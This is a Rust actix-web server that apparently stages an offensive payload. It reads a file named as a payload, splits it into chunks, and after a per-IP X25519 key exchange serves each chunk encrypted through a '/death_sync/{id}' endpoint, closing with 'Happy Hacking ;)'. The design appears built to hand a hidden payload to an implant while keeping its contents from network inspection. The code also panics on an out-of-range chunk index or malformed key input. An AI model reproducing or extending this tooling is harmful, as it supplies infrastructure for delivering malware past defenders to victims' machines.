use actix_web::{
    get, post,
    web::{Bytes, Data, Json, Path},
    App, HttpRequest, HttpServer, Responder,
};
use crypt::{self, encrypt};
use hex::{decode, encode};
use serde::{Deserialize, Serialize};
use std::fs;
use std::sync::{Arc, Mutex};
use std::{collections::HashMap, net::IpAddr};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};

const PAYLOAD_PATH: &str = "./test/test";

#[derive(Clone)]
struct ClientsState {
    hashmap: Arc<Mutex<HashMap<IpAddr, SharedSecret>>>,
    chunked_payload: Vec<Vec<u8>>,
}

#[derive(Serialize)]
struct ExchangeResponse {
    publickey: String,
    chunks: usize,
}

#[post("/exchange")]
async fn exchange_keys(req: HttpRequest, body: Bytes, data: Data<ClientsState>) -> impl Responder {
    let mut key_table = data.hashmap.lock().unwrap();
    if let Some(val) = req.peer_addr() {
        let ip = val.ip();
        if !key_table.contains_key(&ip) {
            let secret = EphemeralSecret::random();
            let public = PublicKey::from(&secret);

            let hex_peer_public = body.to_ascii_lowercase();
            let peer_public: Result<[u8; 32], _> =
                decode(hex_peer_public).unwrap().as_slice().try_into();

            let peer_public_key = match peer_public {
                Ok(array) => PublicKey::from(array),
                Err(_) => {
                    eprintln!("Invalid public key");
                    return Json(ExchangeResponse {
                        publickey: String::from(""),
                        chunks: 0, 
                    });
                }
            };

            let shared_secret = secret.diffie_hellman(&PublicKey::from(peer_public_key));
            let hex_public = encode(public.as_bytes());
            key_table.insert(ip, shared_secret);

            return Json(ExchangeResponse {
                publickey: hex_public,
                chunks: data.chunked_payload.len(), 
            });
        } else {
            eprintln!("Collision detected for IP: {}", ip);
            return Json(ExchangeResponse {
                publickey: String::from(""),
                chunks: 0, 
            });
        }
    };
    return Json(ExchangeResponse {
        publickey: String::from(""),
        chunks: 0, 
    });
}

#[derive(Serialize)]
struct SyncResponse {
    enc_payload: String,
    nonce: String
}

#[get("/death_sync/{id}")]
async fn death_sync(req: HttpRequest, path: Path<u32>, data: Data<ClientsState>) -> impl Responder {
    let id = path.into_inner() as usize;
    let key_table = data.hashmap.lock().unwrap();
    if let Some(val) = req.peer_addr() {
        let ip = val.ip();
        match key_table.get(&ip) {
            Some(value) => {
                let chunk = data.chunked_payload[id].clone();
                let key = crypt::str_to_key(value.as_bytes());
                let nonce = crypt::gen_nonce();
                let ciphertext = crypt::encrypt(nonce, key, &chunk).unwrap();
                let enc_payload = encode(ciphertext);
                let enc_nonce = encode(nonce);
                return Json(SyncResponse {
                    enc_payload: enc_payload,
                    nonce: enc_nonce
                });
            }
            None => {
                eprintln!("The ip {} didn't initialized before syncing", ip);
            }
        }
    };

    return Json(SyncResponse {
        enc_payload: "".to_string(),
        nonce: "".to_string()
    });
}

#[get("/end")]
async fn end(req: HttpRequest, data: Data<ClientsState>) -> impl Responder {
    let mut key_table = data.hashmap.lock().unwrap();

    if let Some(val) = req.peer_addr() {
        let ip = val.ip();
        if !key_table.contains_key(&ip) {
            eprintln!("The ip {} didn't initialized before syncing", ip);
            return "You need to initialize MF";
        } else {
            key_table.remove(&ip);
            return "Happy Hacking ;)";
        }
    };

    "Unknown"
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let content: Vec<u8> = fs::read(PAYLOAD_PATH)?;
    let chunk_size = 64*1024;
    let chunked_payload: Vec<Vec<u8>> = content
        .chunks(chunk_size)
        .map(|chunk| chunk.to_vec())
        .collect();
    let client_data = ClientsState {
        hashmap: Arc::new(Mutex::new(HashMap::new())),
        chunked_payload,
    };

    HttpServer::new(move || {
        App::new()
            .app_data(Data::new(client_data.clone()))
            .service(exchange_keys)
            .service(death_sync)
            .service(end)
    })
    .bind(("127.0.0.1", 8080))?
    .run()
    .await
}
